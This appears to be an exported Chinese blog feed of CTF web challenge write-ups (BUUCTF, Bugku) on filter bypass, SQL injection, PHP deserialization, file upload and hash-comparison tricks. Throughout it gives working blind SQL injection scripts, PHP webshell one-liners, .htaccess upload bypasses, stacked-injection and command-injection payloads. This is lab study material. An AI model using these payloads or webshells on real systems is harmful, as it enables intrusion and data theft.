考点分析一下: 1.如何绕过过滤？绕过preg_match方法有两种:(1).preg_match会去努力的去匹配第一行，所以我们可以利用多行的方式进行绕过: POST:cmd={ &quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;} 也可以直接加一个**%0A**这个也是代表换行符(2).利用PCRE回溯绕过脚本 import requestspayload = '{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;a&quot;:&quot;' + &quot;a&quot;*(1000000) + '&quot;}'res = requests.post(&quot;http://c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn/&quot;, data={&quot;cmd&quot;:payload})print(res.text) 2.为什么我们无法使用cat命令？putenv(‘PATH=/home/rceservice/jail’)根据这行源码，读出jail应用于当前环境，我们能使用ls应该是 jali包含了执行二进制文件，所以我们可以直接拉出cat的路径: {&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;} 注意：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 通过以上成功拿到flag [CISCN2019 总决赛 Day2 Web1]Easywebimage.php.bak源码泄露: &lt; ?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); 首先进行绕过，这里测试一下绕过语句: select * from images where id='' or path=''; &lt;?php$id=&quot;\\\\0&quot;;$id=addslashes($id);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);print($id); \\ 可见当我们输入\\\\0的时候最终的结果是\\逃逸出来了，设想一下，如果我们在id输入这个，那么久会变成 select * from images where id='\\' or path='';此时后面那个单引号被转义，变成是id=\\' or path='如果我们在path后插入注入语句or 1=1#，将变成id='\\' or path=' or 1=1#' 这里贴一下盲注脚本: import requestsurl = &quot;http://803aae5e-79fb-4520-960c-d67666295f67.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;s=requests.session()payload = &quot; or ascii(substr((select password from users),{},1))&gt;{}%23&quot;result = ''for i in range(0,100): high=127 low=32 mid= (low+high) // 2 while(high&gt;low): if 'JFIF' in s.get(url+payload.format(i,mid)).text: low=mid+1 else: high=mid mid=(low+high)//2 result +=chr(mid) print(result) 跑出账号密码，登陆以后发现可以上传文件：随便上传了一个内容: I logged the file name you uploaded to logs/upload.d74bd5e2a76d1aa9b34f21ca9e866a8b.log.php. LOL 无法上传php文件 但是可以发现 我们存入的文件名都出现在了这个php文件当中如果我们传入一句话木马文件名，那么就会被这个php解析了 由于php被过滤了，所以这里我们使用短标签进行绕过:burp抓包，改文件名为 &lt;?=@eval($_POST['a']);?&gt; POST数据或者蚁剑连接都行 a=system('cat /flag'); 小结有点久没刷题了、。。罪过，这次也是收获了不少，感觉sql的调试技巧有点遗忘了，直接复制代码会本地测试就行了~","link":"/2021/05/15/buuctf15/"},{"title":"buuctf2","text":"easy_tornado在hints.txt中发现文件包含，但是需要满足同时输入以下内容 我们不知道cookie_secret所以这里MD5解码一下然后去看一下 md5(cookie_secret+md5(filename))619ae5434035a986a24fdc06520654a3发现解不开，所以更换思路看到welcome.txt提示render（渲染），结合标题tornado（python框架）推测存在ssti注入 出现不同参数，去tornado查找一下参数看看： 发现cookie_secret，想想有没有获取到这个内容的方法 由于是tornado框架，于是去查询了：cookie_secret在tornado.web.RequestHandler当中生成 而要访问tornado.web.RequestHandler的对象，需要使用handler，所以这里的payload即为 1handler.settings 即可拿到秘钥: 12/flag.txtflag in /fllllllllllllag 这里写了个脚本: 1234567import hashlibhash_encode='/fllllllllllllag'hash_encode = hashlib.md5(hash_encode.encode(&quot;utf-8&quot;)).hexdigest()hash_co_secret='5b1ce5ca-faa2-4f23-8b87-767c644f4baa'+hash_encodehash_encode=hashlib.md5(hash_co_secret.encode(&quot;utf-8&quot;)).hexdigest()print(hash_encode) 拓展学习：Tornado.web.Application的settings参数: https://blog.csdn.net/ljphilp/article/details/47103745 思路整理在思考这题的时候一直在想赵老师说的遇到不懂的就去查一下相关资料，一直在思考这其中的思考链：结合tornado render 我们大致可以推测出有关python的模板注入——在找到ssti注入点后，我思考的是通过子类追踪到cookie_secret但是被过滤掉了太多内容，所以这个时候应该换一个思路——cookie_secret放在哪里？查到资料放在Tornado.web.Application.RequestHandler.settings这个当中，那么我们如何进入这个子类查询到setting呢？此时我们就可以发现这个东西，然后接下来去构造语句去试探。 [极客大挑战 2019]PHP备份文件源码泄露的亚子，于是试了一下几个常见的备份，发现www.zip备份文件泄露打开index.php得到: 12345&lt;?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?&gt; 反序列化漏洞？再看看其他 12345678910111213141516171819202122232425262728class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;; die(); 八成试了，看到这个_wakeup()函数了，这个时候我们需要绕过函数，去看看如何写程序: 12345678910111213&lt;?phpclass Name{ public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } }$a=new Name('admin',100);//这的100是数字不是str所以不能加引号。$b=serialize($a);$b=str_ireplace(&quot;:2:&quot;,&quot;:3:&quot;,$b);print($b);?&gt; 结果: 1O:+4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;} 但是我不管如何尝试都没有回显，于是打开phpstorm手动调试了一下发现是可以进入flag的 这个时候就很懵了，于是去查了一下wp: **上面是public属性时的username和password参数，下面是private参数的，可以看到Name和username之间都有一个空格，**当我复制到url的时候这个截断就没了，所以需要加个%00 1O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;} 一点体会:在做buu的题目的时候，感觉整体思路是可以有了，但是总是会卡在某些点，比如上面这个，我就不清楚private原来和global有这个不同，以后遇到这中情况，记得去对比一下public，或者看一下和以前做过的题比哪里不一样了，寻找突破点。 upload1思路:确定白黑名单过滤，若为黑名单，尝试php3,phtml等后缀，修改mime类型绕过图片检查，加入图片文件头等:发现检查了&lt;?所以更换一句话木马书写方式: 1&lt;script language=&quot;php&quot;&gt;evla($_POST[a]);&lt;/script&gt; 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$file = $_FILES[&quot;file&quot;];// 允许上传的图片后缀$allowedExts = array(&quot;php&quot;,&quot;php2&quot;,&quot;php3&quot;,&quot;php4&quot;,&quot;php5&quot;,&quot;pht&quot;,&quot;phtm&quot;);$temp = explode(&quot;.&quot;, $file[&quot;name&quot;]);$extension = strtolower(end($temp)); // 获取文件后缀名$image_type = @exif_imagetype($file[&quot;tmp_name&quot;]);if ((($file[&quot;type&quot;] == &quot;image/gif&quot;)|| ($file[&quot;type&quot;] == &quot;image/jpeg&quot;)|| ($file[&quot;type&quot;] == &quot;image/jpg&quot;)|| ($file[&quot;type&quot;] == &quot;image/pjpeg&quot;)|| ($file[&quot;type&quot;] == &quot;image/x-png&quot;)|| ($file[&quot;type&quot;] == &quot;image/png&quot;))&amp;&amp;$file[&quot;size&quot;] &lt; 20480) // 小于 20 kb{ if ($file[&quot;error&quot;] &gt; 0){ echo &quot;ERROR!!!&quot;; } elseif (in_array($extension, $allowedExts)) { echo &quot;NOT！&quot;.$extension.&quot;!&quot;; } elseif (mb_strpos(file_get_contents($file[&quot;tmp_name&quot;]), &quot;&lt;?&quot;) !== FALSE) { echo &quot;NO! HACKER! your file included '&amp;#x3C;&amp;#x3F;'&quot;; } elseif (!$image_type) { echo &quot;Don't lie to me, it's not image at all!!!&quot;; } else{ $fileName='./upload/'.$file['name']; move_uploaded_file($file['tmp_name'],$fileName); echo &quot;上传文件名: &quot; . $file[&quot;name&quot;] . &quot;&lt;br&gt;&quot;; }}else{ echo &quot;Not image!&quot;;}?&gt; 这边需要猜测上传路径，由于页面为upload_file.php,所以这里猜测upload，发现可以连接上:,找到以上源码，学习分析一波: 黑名单，检查MIME类型，检查&lt;?，使用了exif_imagetype函数，这个函数是检查文件的前几个字节，upload里面有介绍过，使用文件马绕过，这里可以使用文件合成以后，再将后缀改回phtml直接上传。这里有个巨坑！！！！！！！！！！文件大小小于20kb，我一开始用图片马不行，后来看了wp看到人家只用了gif89a就可直接绕过，明明我用文件合成以后也有这个，才发现原来是有个文件大小限制，我吐了！！这一点以后要记住呀不然也可以以后直接使用GIF89a实现绕过。就不用考虑文件大小的关系了。尝试了一下，这题用不了apache的解析漏洞 这里再来梳理一下这题的思路吧:黑名单or白名单:黑名单:先使用其他后缀进行尝试，或者使用解析漏洞，若被拦截，改一下mime类型以及加一下头识别字节(GIF89a)文件上传最主要的还是耐心吧，毕竟有很多要去测试 http扫描目录，后缀字典，看看有么有隐藏目录，发现/Secret.php 一看就知道要改referer， 中间有个改浏览器的，直接看看哪里有个firefox，然后改一下 babysql双写绕过+union select [ACTF2020 新生赛]Uploadburp suit改后缀，phtml后缀即可绕过,这里需要抓包改后缀 [ACTF2020 新生赛]BackupFile备份文件尝试一下 发现index.php.bak 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) {//不能为字符串 只能输入数字，所以就想到十六进制 exit(&quot;Just num!&quot;); } $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) { echo $flag; }}else { echo &quot;Try to find out source file!&quot;;} 考察弱类型比较，数字和字符串比较时，遇到字符串会自动截断后面内容，只会进行前面数字的比较例如123a和123就是相等的，但是a123和123就不等","link":"/2021/03/18/buuctf2/"},{"title":"bugku4","text":"web37先扫下后台，看有没有其他东西，发现没有，再登录窗口尝试手工注入也没有结果，再找找有没有其他提示吧:收到的报文中有一个，把他拿去base64解码 123$sql=&quot;SELECT username,password FROM admin WHERE username='&quot;.$username.&quot;'&quot;;if (!empty($row) &amp;&amp; $row['password']===md5($password)){} 从上面这里看来，闭合的手段是.&quot;': 根据下面的提示是password强==md5编码的password===说明类型数值都要一样，那么如果让其相等呢，去查了一下，发现其实可以使用union联合语句payload: 11.&quot;'union select 1,'e10adc3949ba59abbe56e057f20f883e'# 这里解释一下为什么，首先为什么说是知道字段数为2？——猜的一个个去试然后这样写的原理是什么：union select 1,’e…’被执行后的值为那个row我是从数据库检索以后的结果，当执行了这个union select语句，row的值就会被赋予检索的password的值，然后此时就和我们输入的password的MD5的值是一致的了进入到这个页面，联想到之前的命令执行，但是尝试了好多种都没返回有用的信息？是什么鬼 然后就去百度了，发现这里需要用时间盲注，因为输入1；sleep 5 页面是有延缓回显的，那么问题来了，接下来要干啥了，然后就去看了一下wp，发现，是要监听端口然后反弹shell的，这里就很无语了，因为监听了好久都没有反弹，用公网也不行，so就再去查了一下wp，发现是要写入文件然后查看。。。。。。。。我吐了，这里写一下payload吧: 1123|ls../../../&gt;text 上面是遍历目录，并将信息输出到text 1123|cat /flag&gt;test 将flag的信息输出到test中 web38这一关是布尔盲注，根据我们的输入信息，有illegal character 、password wrong 、username don’t exit这几种情况，所以这里我们先用burpsuit 跑一下看哪些字符被过滤了发现 = 被过滤了 还有其他但是盲注的所需要的命令倒是没怎么被过滤，但是最重要的=没了，要怎么办呢？，这个时候看到下面有人提示说用&lt;&gt;来代替，去查了一下: 接下来构造注入语句想起来之前刚学的使用减号进行连接并以此判断该值是否为真的方法，并且减号也没有被过滤admin’-0-‘是password wrongadmin’-1-‘是username wrong 这里有个mid函数是可以用的，所以我们直接用前几天刚写的试试看 12345678910111213141516171819202122import requestsurl=&quot;http://114.67.246.176:10460/index.php&quot;s=requests.session()headers={&quot;Cookie&quot;: &quot;PHPSESSID=34kfhvoilevqk4p779t36qc2j5&quot;}password = &quot;&quot;for i in range(1,33): for j in '0123456789abcdef': payload =f&quot;admin'-(mid((password)from(-{i}))&lt;&gt;'{j}{password}')-'&quot; #这里的&lt;&gt;看到解释是不等为ture 布尔值为1，那么相等就是false，布尔值为0，所以和之前的脚本相比，只要吧下面的判断改一下就行了 print(payload) data = {'username': payload,'password': 'sky'} # print(s.post(url,data=data).text) if 'password error!' in s.post(url=url,data=data,headers=headers).text: #print(s.post(url,data=data).text) strA = password password = strA[::-1] print(password)#可不用，是用来调试的 password += j strA = password password = strA[::-1] print(password) break 好的跑出来了4dcc88f8f1bc05e7c2ad1a60288481a2 像是MD5，去解码一下，得到以下密码bugkuctf登录以后:flag{75ef5a74fee872de4e775bbbf2f01d22}就成功拿到flag 了","link":"/2021/02/03/bugku4/"},{"title":"buuctf4","text":"[GXYCTF2019]BabySQli这题曾经遇到过，查看源码: 1234if($arr[1] == &quot;admin&quot;){ if(md5($password) == $arr[2]){ echo $flag; } 这里是关键，首先是账号等于admin，接下来是输入的密码等于查询到的密码，我们知道union联合查询如果是本来数据库当中没有的值 则会先新建一个，那么这里我们就利用这点，paylaod: 1name=-1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&amp;pw=123456 此时查询到的就是我们注入的这个admin里面的密码了 [网鼎杯 2020 青龙组]AreUSerialz这是一题反序列化的题，最近刚学完，趁热打铁做做 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879include(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename);//利用点在这 } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }}function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); }} 1.在read()方法中看到一个file_get_contents()函数，所以接下来就看看如何靠拢2.很明显。。。主要是op要为2即可进入read()当中 这里有个参数很奇怪，是个protect参数：这里需要我们学习一下protect属性的参数private类型在序列化的格式为:%00类名%00*protected为:%00%00变量** exp123456789101112&lt;?phphighlight_file(__FILE__);class FileHandler { public $op = 2; public $filename =&quot;flag.php&quot;; public $content=&quot;2&quot;;}$a = new FileHandler();$b = serialize($a);echo($b);?&gt; 考点1：在function中的__destruct使用强比较，比较op的值是否为2，所以此时我们需要绕过，由于比较的是“2”这是一个字符串，所以我们可以传入一个int类型的数据2，这样就可以绕过了。考点2：开头对于op，filename等变量的值的属性是protect，当我们打印出来以后，是 * 的如果我们直接复制粘贴到url中，这个是会被自动删除的，所以需要加个\\00但是由于它那边有个is_valid的函数，所以这边就会过滤，改成其他师父们说%00，我也觉得按理说这个也是可以的，但是不知道为啥没有结果？所以感觉很奇怪所以绕过点在这:**在php7.1+对类属性的检测不严格，所以可以用public来绕过 ** [MRCTF2020]你传你🐎呢这个文件上传不会难1.MIME类型更改为image/jpeg类型2.上传一句话木马，后缀改为jpg3.上传.htaccess： 1SetHandler application/x-httpd-php /var/www/html/upload/102a52cfbbd15e8c5b5f294d84090158/12 (2).jpg succesfully uploaded!/var/www/html/upload/102a52cfbbd15e8c5b5f294d84090158/.htaccess succesfully uploaded! 获得以上路径 1flag{1f5f9c64-a2c2-4f6d-96f2-a18df9744090} [GYCTF2020]Blacklist本题考查的依旧是堆叠注入: 1234set @sql=concat('s','elect `flag` from `FLAGHere`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;1';PREPARE hacker from concat(char(115,101,108,101,99,116), ' * from `FlagHere` ');EXECUTE hacker;# 由于过滤了很多 所以以上内容都用不了这里查到了一种新方法: mysql查询语句-handler mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。2 基本语法 1234567891011 handler语句的语法如下：HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE ​ 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。​ 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。​ 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 通过索引去查看的话可以按照一定的顺序，获取表中的数据。通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 如果我们不想浏览一个表的所有行，可以使用where和limit子句。 所以这里的payload: 10';use supersqli;handler FlagHere open;Handler FlagHere read first; 参考:https://blog.csdn.net/JesseYoung/article/details/40785137 [MRCTF2020]Ez_bypass123456789101112131415161718192021222324252627282930313233343536373839include 'flag.php';$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo &quot;can you think twice??&quot;; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); }} else { echo &quot;You are not a real hacker!&quot;; }}else{ die('Please input first');}}Please input first [强网杯 2019]高明的黑客还没遇到这种题，所以一开始看得眼花缭乱的下载一个7-zip将www.tar.gz解压缩出来就行，解压缩出来以后看到很多代码并且看到很多getshell的语句这里考查的就是编写脚本的能力: 这里贴一个大佬的python: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import osimport requestsimport reimport threadingimport timeprint('开始时间： '+ time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100) #这儿设置最大的线程数filePath = r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;os.chdir(filePath) #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # 设置连接活跃状态为Falsedef get_content(file): s1.acquire() print('trying '+file+ ' '+ time.asctime( time.localtime(time.time()) )) with open(file,encoding='utf-8') as f: #打开php文件，提取所有的$_GET和$_POST的参数 gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) data = {} #所有的$_POST params = {} #所有的$_GET for m in gets: params[m] = &quot;echo 'xxxxxx';&quot; for n in posts: data[n] = &quot;echo 'xxxxxx';&quot; url = 'http://127.0.0.1/src/'+file req = session.post(url, data=data, params=params) #一次性请求所有的GET和POST req.close() # 关闭请求 释放内存 req.encoding = 'utf-8' content = req.text #print(content) if &quot;xxxxxx&quot; in content: #如果发现有可以利用的参数，继续筛选出具体的参数 flag = 0 for a in gets: req = session.get(url+'?%s='%a+&quot;echo 'xxxxxx';&quot;) content = req.text req.close() # 关闭请求 释放内存 if &quot;xxxxxx&quot; in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data={b:&quot;echo 'xxxxxx';&quot;}) content = req.text req.close() # 关闭请求 释放内存 if &quot;xxxxxx&quot; in content: break if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0， param = a else: param = b print('找到了利用文件： '+file+&quot; and 找到了利用的参数：%s&quot; %param) print('结束时间： ' + time.asctime(time.localtime(time.time()))) s1.release()for i in files: #加入多线程 t = threading.Thread(target=get_content, args=(i,)) t.start() 作为一个菜鸡，我觉得从最简单的开始写起,希望能学到点东西: 123456import osimport requestsfilePath=r&quot;C:\\Users\\10452\\Desktop\\src&quot;files = os.listdir(filePath)print(len(files))#3002 所以一共有3002个文件 12345with open(file,encoding='utf-8') as f:#这个是打开文件的方式 gets=list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) #两个正则表达式，用来匹配GET和POST，这里可以学习一下其书写方式: #这里的反斜杠都是为了避免歧义的，屏蔽掉在python正则表达式中原本的功能 12with open（'路径','r'）as f: print(f.read())#打开文件并读取 这里尝试一下: 1234567import osfilePath=r&quot;C:\\Users\\10452\\Desktop\\src&quot;files = os.listdir(filePath)file=filePath+&quot;\\\\&quot;+files[0]print(file)with open(file,encoding=&quot;utf-8&quot;) as f: print(f.read()) 正则 re.findall 的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组）语法： 1234//re.findall(pattern, string, flags = 0 )import rea=&quot;asdasd&quot;print(re.findall(&quot;asd&quot;,a)) 设置线程 1234import threadings1=threading.Semaphore(100) requests.adapters.DEFAULT_RETRIES = 5s1.acquire() semaphore学习:https://my.oschina.net/u/3524921/blog/920303 没学过也就这几个了，接下来上手复写一下:感受一下大佬的代码，python还是需要继续学习！ 有个槽点:这里的system针对的是linux系统内的echo 所以需要更换一下 这里是payload 1/xk0SzyKwfzw.php?Efa5BVG=cat /flag","link":"/2021/03/28/buuctf4/"},{"title":"bugku2","text":"web221&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 这个explode(“a”,$b),以a为分隔，将b分割成一个个数组 还是比较无语的，这段话翻译过来就是: 123&lt;?phpassert($_GET['s']);?&gt; 接下来让我们康康这个assert()函数是干啥的 assert($assertion) — 检查一个断言是否为 FALSE有一点和eval函数很像它如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/ 所以我们可以直接构造payload:?s=指令，接下来我们就康康有什么是可以查看目录下文件的指令获取更多信息吧 1.scandir() 列出指定路径中的文件和目录这是一个array，所以要输出需要用print_r2.直接使用system指令:system(ls)system(dir)看到有两个文件，直接打开就行 web18又要写亲爱的脚本了 1234567891011import requestss = requests.session()//建立连接url='http://114.67.246.176:11655/'headers = s.get(url).headersreq = s.get(url)//get数据a = req.text[req.text.find('about')+5:req.text.find('=?')]//截取算式print(a)//我的调试aa = eval(a)//eval()函数和PHP的类似，可以直接将其中的当做代码运行，所以直接将算式得出d = {'value':aa}//让post的值为aareq = s.post(url,data=d)print(req.text) 可能要多运行几次，应该这个数太大了然后就可以了 web23这题是有一个正则表达式 123456 &lt;?php highlight_file('2.php');$key='flag{********************************}';$IM= preg_match(&quot;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);if( $IM ){ die('key is: '.$key);}?&gt; 也就是从我们输入的id当中，满足那个正则表达式才行将正则表达式进行拆分: 正则表达学习key:匹配key字符.*:点是匹配除了换行符以外的任意字符,加了星号表示匹配多个正则表达式key：再匹配一次key，.{4,7}:匹配4-7次的任意字符（除换行符）key：再匹配一次key匹配普通字符:/：匹配一次/.:在任意匹配一个字符/：在匹配一次/(.*key）同上匹配，()只改变逻辑顺序[a-z]匹配a-z任意一个字符[:punct:]:特殊字符，在加一个中括号，就是在特殊字符中去一个根据以上:keyakeyaaaaakey:/a/akeyb@然后就可以获得flag web24查看页面源码，发现有个code.txt，点进去，即可看到源码: 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } }}?&gt; 可以知道他需要我们传入3个值 且v1=v2 v3不等于flag。查询可以知道，如果两个类型不一样也会直接返回0，flag是字符串，所以我们构造一个字符数组，所以payload为: 1?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=f web25根据提示，这题需要的是hint:sql约束攻击，学习了一下什么是sql约束攻击:参考:https://www.freebuf.com/articles/web/124537.html总结一下就是，在一般情况下，SQL执行操作时，会将查询字符串末尾的空格一并删除，特殊情况看以上博客当我们插入一个新数据，admin（很多空格）1，但是数据库有插入长度限制，比如说是10，那么我们插入的这个数据10位以后的数据将被舍弃，变成admin(5个空格)，接下来执行select查询的时候，这个五个空格又会被自动忽略，查询的就是admin了 在本题中：我先注册了一个admin(+3个空格)1的账号，发现后面的1没有被约束掉，所以继续增加空格数量，注册后输入admin以及我们刚设的新密码，即可登录管理员帐号 web26Referer: https://www.google.com web27好像是缺少了源码:QNKCDZO的MD5加密：0e830400451993494058024219903391让我们get一个a； MD5碰撞ctf中md5常见绕过字符串0e:PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 数组绕过当md5接受的参数为数组时，其值都为0，所以构造payload: 1?a[]=1&amp;b[]=2 真实碰撞使用MD5快速碰撞软件 https://muouim.github.io/2019/01/30/MD5%E7%A2%B0%E6%92%9E/参考链接 web28XFF伪造跟前面有一题是一样的payload：burp抓包，然后添加，X-Forwarded-For:127.0.0.1 web29这一关有源码，我们直接看源码了:id就是输入margin然后因为哈希一样，这里就尝试一下使用数组绕过了，可以成功不过有个值要用post 发送数据 web30：提示说txt，打开以后出现源码 123456789101112131415&lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;}else{echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;}}?&gt; 